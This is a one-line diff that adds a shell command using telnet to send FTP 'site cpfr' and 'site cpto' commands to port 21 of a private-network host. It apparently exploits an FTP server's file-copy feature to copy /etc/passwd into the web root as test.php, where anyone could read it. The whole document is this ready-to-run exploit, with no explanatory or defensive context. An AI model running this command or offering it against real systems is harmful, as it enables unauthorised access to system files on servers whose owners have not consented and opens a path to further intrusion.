@@ -1,0 +1,1 @@
+{ echo "site cpfr /etc/passwd"; sleep 1; echo "site cpto /var/www/html/test.php"; sleep 1;  echo "quit"; } | telnet 10.80.35.230 21
